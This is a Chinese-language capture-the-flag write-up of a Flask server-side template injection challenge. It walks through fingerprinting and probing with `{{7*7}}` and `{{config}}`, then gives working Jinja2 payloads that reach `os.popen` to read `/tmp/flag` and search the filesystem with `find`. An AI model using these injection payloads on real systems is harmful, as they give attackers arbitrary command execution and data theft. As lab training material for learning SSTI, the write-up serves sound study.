## 题解

### 入口与指纹

`Werkzeug/3.0.3` + `Python/3.9.25`，`/` 是 `SSTI Demo` 表单（GET 到 `/greet`），
`/greet?name=` 把输入拼进 `render_template_string(f"Hello, {name}!")`。

### 关键观察

`{{7*7}}` → `Hello, 49!`，SSTI 成立。
`{{config}}` 能 dump Flask 配置；`cycler.__init__.__globals__.os` 可用，但容器里没有
`/flag.txt`，flag 在 `/tmp/flag`。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -G \
  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("cat /tmp/flag").read() }}' \
  "http://$T/greet" | grep -o 'flag{[^}]*}'
```

定位 flag 可用：

```bash
name={{ config.__class__.__init__.__globals__["os"].popen("find / -maxdepth 3 -iname '*flag*'").read() }}
```

### flag 位置

容器内 `/tmp/flag`。

## 复盘

- 先 `{{7*7}}` 定性，再 `{{config}}` 看上下文，最后走 `os`。
- 容器里的 flag 路径不一定叫 `/flag.txt`；用 `find` 一次定位比猜快。
